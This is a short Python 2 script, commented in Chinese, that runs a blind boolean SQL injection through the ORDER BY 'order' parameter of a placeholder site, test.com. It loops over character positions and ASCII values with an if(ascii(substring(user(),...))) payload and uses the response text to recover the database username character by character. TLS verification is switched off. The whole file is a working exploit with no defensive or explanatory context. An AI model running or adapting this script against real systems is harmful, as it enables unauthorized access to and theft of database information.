#!/usr/bin/env python
# coding=utf-8
#注入点发生在order by后面。

import re
import sys
import warnings
import requests

warnings.filterwarnings("ignore")
reload(sys)
sys.setdefaultencoding('utf-8')
headers = {
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
}

key = ""

for j in range(1, 22, 1):
    for i in range(1, 200, 1):
        url = "https://test.com/index.php?page=1&rows=5&sort=pdType&order=asc,if(ascii(substring(user(),"+str(j)+",1))="+str(i)+",1,(select 1 from information_schema.tables))"
        req = requests.get(url, headers=headers, timeout=10, verify=False)
        if req.text.find("pdTypeName") is not -1:
            key += chr(i)
            break
        else:
            pass
    print "用户名:"+key